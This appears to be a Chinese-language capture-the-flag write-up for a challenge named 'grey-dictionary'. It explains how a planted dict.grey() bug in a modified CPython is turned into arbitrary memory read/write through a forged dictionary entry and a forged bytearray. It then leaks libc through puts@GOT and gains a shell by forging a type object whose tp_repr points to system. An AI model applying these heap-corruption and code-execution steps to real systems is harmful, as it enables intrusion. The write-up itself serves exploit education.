# grey-dictionary

## 题目简述

服务运行一份修改过的 CPython。常见进程/文件接口被裁剪，并在 `open`、`FileIO`、`os.open` 中阻止路径包含 `flag.txt`。真正的攻击面是新增的 `dict.grey()`：它修改字典 keys 对象的索引区尺寸元数据并移动 entries，却没有重新分配或重新构建表，导致字典查找越界解释攻击者布置的伪 `PyDictKeyEntry`。目标是把该内存破坏提升为任意读写和原生代码执行。

## 解题过程

补丁中的核心代码为：

```c
size_t entry_size = DK_IS_UNICODE(mp->ma_keys)
    ? sizeof(PyDictUnicodeEntry)
    : sizeof(PyDictKeyEntry);
size_t used_size = entry_size * mp->ma_keys->dk_nentries;

void *buf = PyMem_Malloc(used_size);
memcpy(buf, DK_ENTRIES(mp->ma_keys), used_size);
mp->ma_keys->dk_log2_index_bytes--;
memcpy(DK_ENTRIES(mp->ma_keys), buf, used_size);
```

`DK_ENTRIES()` 的地址依赖 `dk_log2_index_bytes`。把该字段减一后，解释器对索引区和 entry 起点的理解发生变化，但 `dk_nentries`、索引内容和分配大小并未同步。全局 `grey_lock` 只允许触发一次，因此必须先完成确定性的 pymalloc 堆布局。

官方脚本创建若干 8 项字典、固定长度 bytes 和 list，使受害字典的越界第 9 个 entry 落到可控 `fake_stuff`。伪 entry 把整数键 `8` 映射到同一 bytes 缓冲区内伪造的 `PyByteArrayObject`：

```text
fake entry:
  hash  = 8
  key   = id(8)
  value = fake_bytearray_address

fake bytearray:
  ob_refcnt = 0x100
  ob_type   = id(bytearray)
  ob_size   = 0x1000
  ob_alloc  = 0x1000
  ob_bytes  = target_address
  ob_start  = target_address
```

触发 `victim_dict.grey()` 后，访问 `victim_dict[8]` 得到这个伪 bytearray，再包装成 `memoryview`，即可把指定地址范围变成可写缓冲区。初始 `target_address` 对准一个 Python list 的元素指针数组，因此首先获得修改任意 list 元素 `PyObject *` 的能力。

把 `fakeobj_prim[0]` 的元素指针改成另一个伪 bytearray，令其 `ob_bytes` 指向 `puts@GOT`，从该对象读取 8 字节即可泄露 libc 中 `puts` 地址。针对题目固定镜像，脚本用已知偏移计算：

```python
puts_got = id(1) - 0xf97f8
puts = int.from_bytes(fakeobj_prim[0][0:8], "little")
system = puts - 0x325e0
```

这些偏移与服务构建绑定，迁移到不同 CPython/libc 时必须重新测量。

最后在 bytes 数据中伪造一个 `PyTypeObject`，把 `tp_repr` 位置设为 `system`；再伪造一个对象，使其 `ob_type` 指向该类型。伪对象起始 8 字节写为：

```python
arg = b".bin/sh\x00"
```

该位置同时会被解释为引用计数，list/临时引用增加一次后首字节从 `.` 的 `0x2e` 变成 `/` 的 `0x2f`，内存开头恰好成为 `/bin/sh\0`。将 `fakeobj_prim[1]` 指向伪对象并调用：

```python
repr(fakeobj_prim[1])
```

CPython 执行 `Py_TYPE(obj)->tp_repr(obj)`，实际变为 `system("/bin/sh")`。拿到 shell 后直接读取真实文件，绕过只存在于 Python API 层的路径过滤，得到：

```text
grey{oh_n0_d0nk3y_k0ng_g0t_ma_keys_6449710d406d}
```

## 方法总结

删除高层 API 不是沙箱。`dict.grey()` 破坏了 CPython 最核心的对象布局，使字典查找可指向伪对象；伪 bytearray 提供地址可控的内存视图，伪 type 的 `tp_repr` 再把任意读写转换为 RIP 控制。该利用强依赖指定 CPython、pymalloc 和 libc 布局，因此应以服务镜像内的实际偏移为准，并把每一步都用对象地址与内存内容验证。
